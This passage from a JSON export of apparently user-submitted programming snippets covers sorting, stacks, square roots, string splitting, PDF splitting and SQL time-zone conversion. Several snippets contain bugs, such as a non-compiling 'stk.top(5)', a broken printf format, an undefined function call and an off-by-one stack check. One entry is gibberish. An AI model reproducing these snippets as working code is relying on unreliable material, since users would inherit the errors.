    "description": "/// sort vector of strings for(auto data: vector_array){ \tsort(data.begin(), data.end()); \tcout<< data<<\" \"; }\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3752,
    "keyword": null,
    "link": null,
    "title": " sort vector struct c++",
    "description": "struct data{     string word;     int number; };   bool my_cmp(const data& a, const data& b) {     // smallest comes first     return a.number < b.number; }  std::sort(A.begin(), A.end(), my_cmp);\n struct data{     string word;     int number; };   bool my_cmp(const data& a, const data& b) {     // smallest comes first     return a.number() < b.number(); }  std::sort(A.begin(), A.end(), my_cmp);\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3753,
    "keyword": null,
    "link": null,
    "title": " sorting",
    "description": "#include <iostream>using namespace std; int main(){    int arr[100];    int size, i, j, temp;     // Reading the size of the array    cout<<\"Enter size of array: \";    cin>>size;     //Reading elements of array    cout<<\"Enter elements in array: \";    for(i=0; i<size; i++)    {        cin>>arr[i];    }    //Sorting an array in ascending order    for(i=0; i<size; i++)    {        for(j=i+1; j<size; j++)        {            //If there is a smaller element found on right of the array then swap it.            if(arr[j] < arr[i])            {                temp = arr[i];                arr[i] = arr[j];                arr[j] = temp;            }        }    }    //Printing the sorted array in ascending order    cout<<\"Elements of array in sorted ascending order:\"<<endl;    for(i=0; i<size; i++)    {        cout<<arr[i]<<endl;    }     return 0;} \nBubble Sort, Selection sort, Merge sort \nA Sorting Algorithm is used to rearrange a given array or list elements according to a comparison operator on the elements. The comparison operator is used to decide the new order of element in the respective data structure.\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3754,
    "keyword": null,
    "link": null,
    "title": " sorting algorithm c++",
    "description": "#include <iostream> using namespace std;  #define MAX 100  int main() { \t//array declaration \tint arr[MAX]; \tint n,i,j; \tint temp; \t \t//read total number of elements to read \tcout<<\"Enter total number of elements to read: \"; \tcin>>n; \t \t//check bound \tif(n<0 || n>MAX) \t{ \t\tcout<<\"Input valid range!!!\"<<endl; \t\treturn -1; \t} \t \t//read n elements \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element [\"<<i+1<<\"] \"; \t\tcin>>arr[i]; \t} \t \t//print input elements \tcout<<\"Unsorted Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl; \t \t//sorting - ASCENDING ORDER \tfor(i=0;i<n;i++) \t{\t\t \t\tfor(j=i+1;j<n;j++) \t\t{ \t\t\tif(arr[i]>arr[j]) \t\t\t{ \t\t\t\ttemp  =arr[i]; \t\t\t\tarr[i]=arr[j]; \t\t\t\tarr[j]=temp; \t\t\t} \t\t} \t} \t \t//print sorted array elements \tcout<<\"Sorted (Ascending Order) Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl;\t \t \t \treturn 0; \t } \n#include<iostream> using namespace std;  int main(int argc, char const *argv[]) {     int numb[7];     int i, j;      for(i=0;i<=6;i++)     {         cout << \"Enter a number\" << endl;         cin >> numb[i];     }      for (i=0;i<=5;i++)     {         for (j=i+1;j<=5;j++)         {             int temp;              if (numb[i] > numb[j])             {                 temp = numb[i];                 numb[i] = numb[j];                 numb[j] = temp;                            }           }         }         for (i=0;i<=6;i++)         {             cout << endl << numb[i] << endl;         } } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  }\n#include <algorithm>    // std::sort  int myints[] = {32,71,12,45,26,80,53,33}; // using default comparison (operator <): std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33  // fun returns some form of a<b std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)\n// sort algorithm example #include <iostream>     // std::cout #include <algorithm>    // std::sort #include <vector>       // std::vector  bool myfunction (int i,int j) { return (i<j); }  struct myclass {   bool operator() (int i,int j) { return (i<j);} } myobject;  int main () {   int myints[] = {32,71,12,45,26,80,53,33};   std::vector<int> myvector (myints, myints+8);               // 32 71 12 45 26 80 53 33    // using default comparison (operator <):   std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33    // using function as comp   std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)    // using object as comp   std::sort (myvector.begin(), myvector.end(), myobject);     //(12 26 32 33 45 53 71 80)    // print out content:   std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it=myvector.begin(); it!=myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3755,
    "keyword": null,
    "link": null,
    "title": " spicoli",
    "description": "while(true){ cout<<\"GNARLY!\"<<endl; } //obviously not solving a real problem, just a big spicoli fan here :)\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3756,
    "keyword": null,
    "link": null,
    "title": " spiral order matrix traversal in C++",
    "description": "vector<int> Solution::spiralOrder(const vector<vector<int> > &A) {    int row_start = 0, row_end = A.size()-1, col_start = 0, col_end = A[0].size()-1;    vector<int> v;    while (row_start<=row_end  && col_start<=col_end)    {        //for row_start        for (int col = col_start; col<=col_end; col++)        {           v.push_back(A[row_start][col]);        }        row_start++;        //for col_end        for (int row = row_start; row<= row_end; row++)        {            v.push_back(A[row][col_end]);        }        col_end--;        //for row_end        for (int col = col_end; col>=col_start; col--)        {            v.push_back(A[row_end][col]);        }        row_end--;        //for col_start        for (int row = row_end; row>=row_start; row--)        {            v.push_back(A[row][col_start]);        }          col_start++;    }    return v;}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3757,
    "keyword": null,
    "link": null,
    "title": " splice string in c++",
    "description": "string str1 = \"Apples are red\"; string str2 = str1.substr(11, 3); // \"red\" string str3 = str1.substr(0, 6); // \"Apples\"\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3758,
    "keyword": null,
    "link": null,
    "title": " split 2d array into chunks in c++",
    "description": "int main(int agrc, char *argv[]) {     const size_t w = 8;     const size_t h = 3;     const size_t c = 2;      int mat[h][w] = {         { 1, 2, 3, 4, 5, 6, 7, 8 },         { 1, 2, 3, 4, 5, 6, 7, 8 },         { 1, 2, 3, 4, 5, 6, 7, 8 }     };      int chunks[w / c][h][c];      split(h, w, mat, c, chunks);      for (int i = 0; i < w / c; i++) {         for (int j = 0; j < h; j++) {             for (int k = 0; k < c; k++) {                 printf(\"= \", chunks[i][j][k]);             }             printf(\"\\n\");         }         printf(\"\\n\\n\");     }      return 0; }\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3759,
    "keyword": null,
    "link": null,
    "title": " split a string based on a delimiter in c++",
    "description": "void tokenize(string &str, char delim, vector<string> &out) { \tsize_t start; \tsize_t end = 0;  \twhile ((start = str.find_first_not_of(delim, end)) != string::npos) \t{ \t\tend = str.find(delim, start); \t\tout.push_back(str.substr(start, end - start)); \t} }  int main() {     string s=\"a;b;c\";     char d=';';     vector<string> a;     tokenize(s,d,a);     for(auto it:a)  cout<<it<<\" \";      return 0; }\n",
    "reg_date": "2021-10-12T11:43:27.000Z"
  },
  {
    "id": 3760,
    "keyword": null,
    "link": null,
    "title": " split pdf",
    "description": "from PyPDF2 import PdfFileWriter, PdfFileReader  inputpdf = PdfFileReader(open(\"document.pdf\", \"rb\"))  for i in range(inputpdf.numPages):     output = PdfFileWriter()     output.addPage(inputpdf.getPage(i))     with open(\"document-page%s.pdf\" % i, \"wb\") as outputStream:         output.write(outputStream) \nHope you have a nice day! These are some best pdf editing sites. 1) https://www.sodapdf.com/split-pdf/ 2) https://www.ilovepdf.com/split_pdf\nBest site I used so far https://www.pdf2go.com/split-pdf\npdftk full-pdf.pdf cat 12-15 output outfile_p12-15.pdf\n#answer already in google. No need for code.\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3761,
    "keyword": null,
    "link": null,
    "title": " split string on character vector C++",
    "description": "string s, tmp;  stringstream ss(s); vector<string> words;  // If there is one element (so komma) then push the whole string if(getline(ss, tmp, ',').fail()) {   words.push_back(s); } while(getline(ss, tmp, ',')){     words.push_back(tmp); } \n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3762,
    "keyword": null,
    "link": null,
    "title": " split text c++",
    "description": "std::stringstream test(\"this_is_a_test_string\"); std::string segment; std::vector<std::string> seglist;  while(std::getline(test, segment, '_')) {    seglist.push_back(segment); //Spit string at '_' character }\n#include <boost/algorithm/string.hpp>  std::string text = \"Let me split this into words\"; std::vector<std::string> results;  boost::split(results, text, [](char c){return c == ' ';});\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3763,
    "keyword": null,
    "link": null,
    "title": " split the array there is an array val of n integers . A good subarray is defined as",
    "description": "int aiwuw' qkjkwj 'q\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3764,
    "keyword": null,
    "link": null,
    "title": " split vector in half cpp",
    "description": "std::vector<int> vec = {89, 15, 51, 27, 98}; std::size_t const half_size = vec.size() / 2; std::vector<int> half1(vec.begin(), vec.begin() + half_size); std::vector<int> half2(vec.begin() + half_size, vec.end());\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3765,
    "keyword": null,
    "link": null,
    "title": " sprintf c++",
    "description": "char myConcatenation[80];     char myCharArray[16]=\"A variable name\";     int myInt=5;     sprintf(myConcatenation,\"%s = %i\",myCharArray,myInt);     Serial.println(myConcatenation);\n#include <stdio.h> int sprintf( char* buffer, const char* format, ... );\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3766,
    "keyword": null,
    "link": null,
    "title": " sql server convert utc to pst SQL command",
    "description": "select CONVERT(datetime, SWITCHOFFSET(dateTimeField, DATEPART(TZOFFSET,  dateTimeField AT TIME ZONE 'Eastern Standard Time')))\n-- all SQL Server versions declare @utc_date datetime = getdate() select @utc_date as utc_time_zone,    dateadd(hh, datediff(hh, getutcdate(), getdate()), @utc_date) as local_time_zone  --SQL Server 2016 and later declare @utc_date datetime = getdate() select @utc_date as utc_time_zone,    getdate() at time zone 'US Eastern Standard Time' as time_zone_est;\nselect   [MyUtcDate] + getdate() - getutcdate() from [dbo].[mytable]\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3767,
    "keyword": null,
    "link": null,
    "title": " sqrt cpp",
    "description": "#include <cmath> sqrt(x);\n#include <math.h>  //get square root of a number \"b\" int main(){   \tint a = 2; //declare number you want to take square root of   \tint sqrtNum = sqrt (a); //assign the sqrt value to a variable   \tcout << sqrtNum << endl; \treturn 0; }\n#include <stdlib.h> #include <stdio.h> #include <math.h>  /* square root of a number */  int main(){ float num, raiz; printf(\"enter a number: \\t\"); scanf(\"%f\",&num); raiz = sqrt(num); printf(\"The square root of %f is: %f.\\n\", num, raiz); system(\"pause\"); return 0;     }\ndouble sqrt(double arg);\n#include <iostream> #include <cmath> using namespace std;  int main() { \tint x = 625; \tint result = sqrt(x); \tcout << \"Square root of \" << x << \" is \" << result << endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3768,
    "keyword": null,
    "link": null,
    "title": " sqrt in c++",
    "description": "#include <cmath> sqrt(x);\n#include <math.h>  //get square root of a number \"b\" int main(){   \tint a = 2; //declare number you want to take square root of   \tint sqrtNum = sqrt (a); //assign the sqrt value to a variable   \tcout << sqrtNum << endl; \treturn 0; }\n#include <stdlib.h> #include <stdio.h> #include <math.h>  /* square root of a number */  int main(){ float num, raiz; printf(\"enter a number: \\t\"); scanf(\"%f\",&num); raiz = sqrt(num); printf(\"The square root of %f is: %f.\\n\", num, raiz); system(\"pause\"); return 0;     }\n#include <iostream> #include <cmath> using namespace std;  int main() { \tint x = 625; \tint result = sqrt(x); \tcout << \"Square root of \" << x << \" is \" << result << endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:28.000Z"
  },
  {
    "id": 3769,
    "keyword": null,
    "link": null,
    "title": " square root c++",
    "description": "#include <cmath> sqrt(x);\n#include <math.h>  //get square root of a number \"b\" int main(){   \tint a = 2; //declare number you want to take square root of   \tint sqrtNum = sqrt (a); //assign the sqrt value to a variable   \tcout << sqrtNum << endl; \treturn 0; }\n#include <stdlib.h> #include <stdio.h> #include <math.h>  /* square root of a number */  int main(){ float num, raiz; printf(\"enter a number: \\t\"); scanf(\"%f\",&num); raiz = sqrt(num); printf(\"The square root of %f is: %f.\\n\", num, raiz); system(\"pause\"); return 0;     }\n#include <iostream> #include <cmath> using namespace std;  int main() { \tint x = 625; \tint result = sqrt(x); \tcout << \"Square root of \" << x << \" is \" << result << endl; \treturn 0; }\n    #include <iostream>     using namespace std;      double SqrtNumber(double num)     {              double lower_bound=0;               double upper_bound=num;              double temp=0;                    /* ek edited this line */               int nCount = 50;          while(nCount != 0)         {                temp=(lower_bound+upper_bound)/2;                if(temp*temp==num)                 {                        return temp;                }                else if(temp*temp > num)                 {                        upper_bound = temp;                }                else                {                        lower_bound = temp;                }         nCount--;      }         return temp;      }       int main()      {      double num;      cout<<\"Enter the number\\n\";      cin>>num;       if(num < 0)      {      cout<<\"Error: Negative number!\";      return 0;      }       cout<<\"Square roots are: +\"<<sqrtnum(num) and <<\" and -\"<<sqrtnum(num);      return 0;      }  \ndouble SqrtNumber(double num) {     double lower_bound=0;      double upper_bound=num;     double temp=0;      while(fabs(num - (temp * temp)) > SOME_SMALL_VALUE)     {            temp = (lower_bound+upper_bound)/2;            if (temp*temp >= num)            {                    upper_bound = temp;            }            else            {                    lower_bound = temp;            }     }     return temp;  } \n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3770,
    "keyword": null,
    "link": null,
    "title": " square root overleaf",
    "description": "\\sqrt{}\n\\sqrt[n]{expression} \n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3771,
    "keyword": null,
    "link": null,
    "title": " srtf program in c++",
    "description": "#include<iostream>  using namespace std; int main() {     int a[10],b[10],x[10];     int waiting[10],turnaround[10],completion[10];     int i,j,smallest,count=0,time,n;     double avg=0,tt=0,end;      cout<<\"\\nEnter the number of Processes: \";  //input     cin>>n;     for(i=0; i<n; i++)     {         cout<<\"\\nEnter arrival time of process: \";  //input         cin>>a[i];     }     for(i=0; i<n; i++)     {         cout<<\"\\nEnter burst time of process: \";  //input         cin>>b[i];     }     for(i=0; i<n; i++)         x[i]=b[i];      b[9]=9999;     for(time=0; count!=n; time++)     {         smallest=9;         for(i=0; i<n; i++)         {             if(a[i]<=time && b[i]<b[smallest] && b[i]>0 )                 smallest=i;         }         b[smallest]--;          if(b[smallest]==0)         {             count++;             end=time+1;             completion[smallest] = end;             waiting[smallest] = end - a[smallest] - x[smallest];             turnaround[smallest] = end - a[smallest];         }     }     cout<<\"Process\"<<\"\\t\"<< \"burst-time\"<<\"\\t\"<<\"arrival-time\" <<\"\\t\"<<\"waiting-time\" <<\"\\t\"<<\"turnaround-time\"<< \"\\t\"<<\"completion-time\"<<endl;     for(i=0; i<n; i++)     {         cout<<\"p\"<<i+1<<\"\\t\\t\"<<x[i]<<\"\\t\\t\"<<a[i]<<\"\\t\\t\"<<waiting[i]<<\"\\t\\t\"<<turnaround[i]<<\"\\t\\t\"<<completion[i]<<endl;         avg = avg + waiting[i];         tt = tt + turnaround[i];     }     cout<<\"\\n\\nAverage waiting time =\"<<avg/n;     cout<<\"  Average Turnaround time =\"<<tt/n<<endl; }\n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3772,
    "keyword": null,
    "link": null,
    "title": " sstream c++",
    "description": "// stringstream::str #include <string>       // std::string #include <iostream>     // std::cout #include <sstream>      // std::stringstream, std::stringbuf  int main () {   std::stringstream ss;   ss.str (\"Example string\");   std::string s = ss.str();   std::cout << s << '\\n';   return 0; }\n// iostream_cerr.cpp // compile with: /EHsc #include <iostream> #include <fstream>  using namespace std;  void TestWide( ) {    int i = 0;    wcout << L\"Enter a number: \";    wcin >> i;    wcerr << L\"test for wcerr\" << endl;    wclog << L\"test for wclog\" << endl; }  int main( ) {    int i = 0;    cout << \"Enter a number: \";    cin >> i;    cerr << \"test for cerr\" << endl;    clog << \"test for clog\" << endl;    TestWide( ); } \nstd::stringstream os; os << \"12345 67.89\"; // insert a string of numbers into the stream  std::string strValue; os >> strValue;  std::string strValue2; os >> strValue2;  // print the numbers separated by a dash std::cout << strValue << \" - \" << strValue2 << std::endl; \n// EXAMPLE ostringstream ssTextAsStream(\"This is part of the stream.\"); // declare ostringstream string sTextAsString = ssTextAsStream.str(); // converted to string cout << sTextAsString << \"\\n\"; // printed out  /* SYNTAX <YourStringStream>.str() */  /* HEADERS #include <iostream> #include <sstream> using namespace std; */\nsstream  str()\n#include <iostream> std::cin std::cout\n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3773,
    "keyword": null,
    "link": null,
    "title": " stack algorithm in c++",
    "description": "#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include<iostream.h> #include<conio.h> #include<stdlib.h> class stack\n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3774,
    "keyword": null,
    "link": null,
    "title": " stack c++",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n/* Stack is a data structure that provides two O(1) time operations: adding an element to the top and removing an element from the top. It is only possible to access the top element of a stack. */ stack<int> s; s.push(3); s.push(2); s.push(5); cout << s.top(); // 5 s.pop(); cout << s.top(); // 2\n// Fast DIY Stack template<class S, const int N> class Stack { private:     S arr[N];     int top_i;  public:     Stack() : arr(), top_i(-1) {}     void push (S n) {         arr[++top_i] = n;     }     void pop() {         top_i--;     }     S top() {         return arr[top_i];     }     S bottom() {         return arr[0];     }     int size() {         return top_i+1;     } };\n#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\ntypedef struct Nodo{    Elem val;    struct Nodo *next; } *Stack; Stack Empty(){return NULL;} bool IsEmpty(Stack a){return a==NULL;} Elem Top(Stack a){return a->val;}  Stack Pop(Stack l){return l->next;} Stack Push(Elem x,Stack res){     Stack nuevo=(Stack)malloc(sizeof(struct Nodo));     nuevo->val=x;     nuevo->next=res;     return nuevo; }\n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3775,
    "keyword": null,
    "link": null,
    "title": " stack erase",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include <stdio.h> #include <stdlib.h> #include <conio.h>  main() {   struct node {      int data;      struct node *next;   }*pNew,*dltPtr;    struct stack_ptr {      int count;      struct node *top;   }*stack;  int i;  scanf(\"%d\",&i);  pNew = new node;  pNew->data = i;  pNew->next = NULL;  stack = new stack_ptr;  stack->count = 1;  stack->top = pNew;  scanf(\"%d\",&i);  while (i != 0){      pNew = new node;      pNew->data = i;      pNew->next = stack->top;      stack->count++;      stack->top = pNew;      scanf(\"%d\",&i);  }   dltPtr = stack->top;  while (dltPtr != NULL) { \t  printf(\"% d\",dltPtr->data); \t  dltPtr = dltPtr->next;      }   }  \n",
    "reg_date": "2021-10-12T11:43:29.000Z"
  },
  {
    "id": 3776,
    "keyword": null,
    "link": null,
    "title": " stack histogram geeks",
    "description": "#include<bits/stdc++.h> using namespace std; #define PAIR pair <ll ,ll > #define ll long long #define S second #define F first #define pb push_back #define MP make_pair #define sort(x) sort(x.begin(), x.end()); #define fast ios::sync_with_stdio(0);cin.tie(0);cout.tie(0) const ll maxn=1e6+7 , mod=1e9+7; int h[maxn]; stack<int> st; int main(){ \tint n; \tcin>>n; \tfor(int i=0;i<n;i++){ \t\tcin>>h[i]; \t} \tint mx=0,mxt; \tint i=0; \tint bal; \twhile(i<n){ \t\tif(st.empty()==1 or h[st.top()]<=h[i]){ \t\t\tst.push(i); \t\t\ti++; \t\t} \t\telse{ \t\t\tbal=st.top(); \t\t\tst.pop(); \t\t\tif(!st.empty()) mxt=h[bal]*(i-st.top()-1); \t\t\telse mxt=h[bal]*i; \t\t\tmx=max(mxt,mx); \t\t} \t} \ti=n; \twhile(st.empty()==0){ \t\tbal=st.top(); \t\tst.pop(); \t\tif(!st.empty()) mxt=h[bal]*(i-st.top()-1); \t\telse mxt=h[bal]*i; \t\tmx=max(mx,mxt); \t} \tcout<<mx; } \n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3777,
    "keyword": null,
    "link": null,
    "title": " stack implementation",
    "description": "#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n#include <stdio.h>  int MAXSIZE = 8;        int stack[8];      int top = -1;              int isempty() {     if(top == -1)       return 1;    else       return 0; }     int isfull() {     if(top == MAXSIZE)       return 1;    else       return 0; }  int peek() {    return stack[top]; }  int pop() {    int data; \t    if(!isempty()) {       data = stack[top];       top = top - 1;          return data;    } else {       printf(\"Could not retrieve data, Stack is empty.\\n\");    } }  int push(int data) {     if(!isfull()) {       top = top + 1;          stack[top] = data;    } else {       printf(\"Could not insert data, Stack is full.\\n\");    } }  int main() {    // push items on to the stack     push(3);    push(5);    push(9);    push(1);    push(12);    push(15);     printf(\"Element at top of the stack: %d\\n\" ,peek());    printf(\"Elements: \\n\");     // print stack data     while(!isempty()) {       int data = pop();       printf(\"%d\\n\",data);    }     printf(\"Stack full: %s\\n\" , isfull()?\"true\":\"false\");    printf(\"Stack empty: %s\\n\" , isempty()?\"true\":\"false\");        return 0; }\ntypedef struct Nodo{    Elem val;    struct Nodo *next; } *Stack; Stack Empty(){return NULL;} bool IsEmpty(Stack a){return a==NULL;} Elem Top(Stack a){return a->val;}  Stack Pop(Stack l){return l->next;} Stack Push(Elem x,Stack res){     Stack nuevo=(Stack)malloc(sizeof(struct Nodo));     nuevo->val=x;     nuevo->next=res;     return nuevo; }\n#include <iostream> using namespace std; int top = -1; //Globally defining the value of top as the stack is empty      void push (int stack[ ] , int x , int n)     {         if ( top == n-1 )       //If the top position is the last of position of the stack, this means that the stack is full.         {             cout << \"Stack is full.Overflow condition!\" ;         }         else         {             top = top +1 ;            //Incrementing the top position              stack[ top ] = x ;       //Inserting an element on incremented position           }     }     bool isEmpty ( )     {         if ( top == -1 )  //Stack is empty             return true ;          else             return false;     }     void pop ( )      {          if( isEmpty ( ) )         {             cout << \"Stack is empty. Underflow condition! \" << endl ;         }         else             {              top = top - 1 ; //Decrementing top&rsquo;s position will detach last element from stack                     }     }     int size ( )     {         return top + 1;     }     int topElement (int stack[])     {         return stack[ top ];     }     //Let's implement these functions on the stack given above       int main( )     {         int stack[ 3 ];         // pushing element 5 in the stack .         push(stack , 5 , 3 ) ;          cout << \"Current size of stack is \" << size ( ) << endl ;          push(stack , 10 , 3);         push (stack , 24 , 3) ;          cout << \"Current size of stack is \" << size( ) << endl ;          //As the stack is full, further pushing will show an overflow condition.         push(stack , 12 , 3) ;          //Accessing the top element         cout << \"The current top element in stack is \" << topElement(stack) << endl;          //Removing all the elements from the stack         for(int i = 0 ; i < 3;i++ )             pop( );         cout << \"Current size of stack is \" << size( ) << endl ;          //As the stack is empty , further popping will show an underflow condition.         pop ( );        }\n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3778,
    "keyword": null,
    "link": null,
    "title": " stack implementation c++",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n/* Stack is a data structure that provides two O(1) time operations: adding an element to the top and removing an element from the top. It is only possible to access the top element of a stack. */ stack<int> s; s.push(3); s.push(2); s.push(5); cout << s.top(); // 5 s.pop(); cout << s.top(); // 2\n// Fast DIY Stack template<class S, const int N> class Stack { private:     S arr[N];     int top_i;  public:     Stack() : arr(), top_i(-1) {}     void push (S n) {         arr[++top_i] = n;     }     void pop() {         top_i--;     }     S top() {         return arr[top_i];     }     S bottom() {         return arr[0];     }     int size() {         return top_i+1;     } };\n#include <stdio.h>  int MAXSIZE = 8;        int stack[8];      int top = -1;              int isempty() {     if(top == -1)       return 1;    else       return 0; }     int isfull() {     if(top == MAXSIZE)       return 1;    else       return 0; }  int peek() {    return stack[top]; }  int pop() {    int data; \t    if(!isempty()) {       data = stack[top];       top = top - 1;          return data;    } else {       printf(\"Could not retrieve data, Stack is empty.\\n\");    } }  int push(int data) {     if(!isfull()) {       top = top + 1;          stack[top] = data;    } else {       printf(\"Could not insert data, Stack is full.\\n\");    } }  int main() {    // push items on to the stack     push(3);    push(5);    push(9);    push(1);    push(12);    push(15);     printf(\"Element at top of the stack: %d\\n\" ,peek());    printf(\"Elements: \\n\");     // print stack data     while(!isempty()) {       int data = pop();       printf(\"%d\\n\",data);    }     printf(\"Stack full: %s\\n\" , isfull()?\"true\":\"false\");    printf(\"Stack empty: %s\\n\" , isempty()?\"true\":\"false\");        return 0; }\n#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3779,
    "keyword": null,
    "link": null,
    "title": " stack implementation using array in c++",
